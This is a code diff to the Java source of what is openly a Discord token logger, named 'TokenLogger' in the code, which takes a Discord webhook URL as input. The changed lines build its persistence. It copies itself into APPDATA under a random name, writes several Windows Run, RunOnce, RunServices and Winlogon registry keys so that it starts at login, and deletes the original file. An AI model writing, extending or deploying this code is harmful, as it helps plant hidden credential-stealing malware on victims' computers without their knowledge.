@@ -9,15 +9,16 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLDecoder;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
 import java.text.SimpleDateFormat;
 import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Main {
-    private static boolean debug;
-    private static boolean shouldPersist;
-    private static String hideAs = "JNAUtils"; //What the registry entry should be called.
+    private static boolean debug, shouldPersist, randomize_new_name;
+    private static String hideAs = "TokenLogger"; //What the registry entry should be called.
+
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
         // TODO: Check for nitro
@@ -28,7 +29,8 @@ public class Main {
         String discord_webhook_url = args[0]; //Change this
         boolean send_embed = true; //Do not change this (yet)
         boolean ensure_valid = true;
-        debug = false;
+        randomize_new_name = true; //Whether or not a random string shoud be set as the file name
+        debug = true;
         shouldPersist = true;
 
         //Mini
@@ -283,55 +285,100 @@ public class Main {
     }
 
     private static void mini_persistence() throws Exception {
+        String new_name;
         String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
         String decodedPath = URLDecoder.decode(path, "UTF-8");
         String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];
-        String new_name = UUID.randomUUID().toString().substring(16) + ".jar";
-
-        if (file_name.contains(".jar")) {
-            //Make sure there is a file in roaming that does what we do
-            InputStream is = null;
-            OutputStream os = null;
-            try {
-                is = new FileInputStream(new File(System.getProperty("user.dir"), file_name));
-                os = new FileOutputStream(new File(System.getenv("APPDATA"), new_name));
-                byte[] buffer = new byte[1024];
-                int length;
-                while ((length = is.read(buffer)) > 0) {
-                    os.write(buffer, 0, length);
-                    if (debug) {
-                        System.out.println("Moving " + length + "bytes");
-                    }
-
-                }
-            } finally {
-                if(is!=null&&os!=null){
-                    is.close();
-                    os.close();
-                }
-
-            }
-            if (new File(System.getenv("APPDATA"), new_name).exists()) {
-                //Copy file to startup
-                String[] reg_start = {
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\""
-                };
-
-                for (String command : reg_start) {
-                    if (debug) {
-                        System.out.println("Adding reg key: " + command);
-                    }
-                    Process pr = Runtime.getRuntime().exec(command);
-                    pr.destroy();
-                }
-            }
-
-
+        if (randomize_new_name) {
+            new_name = UUID.randomUUID().toString().substring(16) + ".jar";
+        } else {
+            new_name = hideAs;
         }
 
 
+        if (file_name.contains(".jar")) {
+            //Make sure there is a file in roaming that does what we do
+            copyFileTo(new File(System.getProperty("user.dir"), file_name), new File(System.getenv("APPDATA"), new_name));
+            if (new File(System.getenv("APPDATA"), new_name).exists()) {
+                //Copy file to startup
+                //String startup_path = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup";
+                //copyFileTo(new File(System.getenv("APPDATA"), new_name), new File(startup_path));
+
+
+                String[] reg_start = {
+                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "\\" + new_name+"\"",
+                };
+
+                for (String command : reg_start) {
+                    Thread thread = new Thread() {
+                        public void run() {
+                            if (debug) {
+                                System.out.println("Executing command: " + command);
+                            }
+                            try {
+                                Process proc = Runtime.getRuntime().exec(command);
+
+                                BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                                String s = null;
+                                while ((s = stdInput.readLine()) != null) {
+                                    if (s.equalsIgnoreCase("The operation completed successfully.")) {
+                                        System.out.println("Successfulyy added to registry");
+                                        proc.destroy();
+                                    }
+                                }
+
+                                if (proc.isAlive()) {
+                                    System.out.println("Failed to add to registry");
+                                    proc.destroy();
+                                }
+                            } catch (Exception e) {
+                                if (debug) {
+                                    System.out.println(e.getMessage());
+                                }
+                            }
+                        }
+                    };
+                    thread.start();
+
+                }
+            }
+
+            if (new File(file_name).exists()) {
+                if (new File(file_name).delete()) {
+                    System.exit(1);
+                }
+            }
+        }
     }
+    private static boolean copyFileTo(File f1, File f2) throws IOException {
+        InputStream is = null;
+        OutputStream os = null;
+        try {
+            is = new FileInputStream(f1);
+            os = new FileOutputStream(f2);
+            byte[] buffer = new byte[1024];
+            int length;
+            while ((length = is.read(buffer)) > 0) {
+                os.write(buffer, 0, length);
+                if (debug) {
+                    System.out.println("Moving " + length + "bytes");
+                }
+
+            }
+        } finally {
+            if(is!=null&&os!=null){
+                is.close();
+                os.close();
+            }
+
+        }
+
+        return f2.exists();
+    }
+
 }
